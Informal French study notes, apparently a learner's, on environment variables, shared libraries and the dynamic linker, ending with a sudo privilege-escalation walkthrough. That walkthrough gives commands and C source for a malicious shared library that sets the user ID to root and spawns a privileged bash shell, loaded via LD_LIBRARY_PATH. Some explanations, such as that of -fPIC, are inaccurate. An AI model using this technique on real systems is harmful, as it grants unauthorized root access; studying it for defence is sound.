Définition :

Une var d'environnement c'est juste une variable pour chaque utilisateur. En gros chaque env(user) possède ses propres var d'env. Y'a quoi dedans ? ca dépent de la var.

Bibliothèque partagée/dynamique :

lib qui peut être utilisé par plusieurs programme en meme temps sans interférence. Ces lib ne sont pas entièrement dans le fichier binaire final. Seulement ce qui est nécessaire.

Programme statique :

Programme qui ne charge pas de bibli dynamique. Tout est entièrement dans le fichier binaire.

Dynamic linker :  
lie les bibliothèque à un programme. Travail facilité grace à l'option -fPIC.

-fPIC permet de situer la bibliothèque partagé. c'est une optimisation. En gros, si on lance deux fois le meme programme, les deux utiliseront la meme copie de la bibli. Par contre, si deux programme différent utilise la meme bibli, ils auront chacun leur propre copie pour leur propre nécessité. Tous ca facilite la tache pour le dynamic linker.

Liste des var d'env avec vuln :

LD_PRELOAD : Charge des bibliothèques partagés spécifié pour qu'elle chargent avant toute les autres. Donc par exemple si je créer une fonction print() qui stock des variables (rien a voir avec le vrai print) ce serai la fonction de ma bibli dans LD_PRELOAD qui sera prioritaire.

Exemple de vulnérabilité :

j'ai les perm pour executer un programme spécifique en sudo (que j'ai vu en faisant sudo -l).

je regarde quelles lib elle utilise donc : ldd emplacement/du/programme.

je fais gcc -o /tmp/nom_d'une_library qu'il utilise -shared -fPIC /home/user/tools/sudo/library_path.c

-shared pour créer un .so (shared object) partagé. -fPIC pour situer la bibli dynamiquement.

cette commande permet de créer une lib qui a le meme nom qu'un lib que le prog utilise déja pour la remplacer. dans cette lib, on mettra une fonction malvaillante qui aura le meme nom qu'un fonction deja utilisé dans le prog pour la remplacer. Exemple :

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>

void _init() {  
        unsetenv("LD_PRELOAD");  
        setresuid(0,0,0);  
        system("/bin/bash -p");  
}

ensuite, on lance le prog : sudo LD_LIBRARY_PATH=/tmp nom_du_prog ld_library_path dit où chercher la lib partagé (avec la fonction malvaillante) donc dans ce cas ci, dans tmp
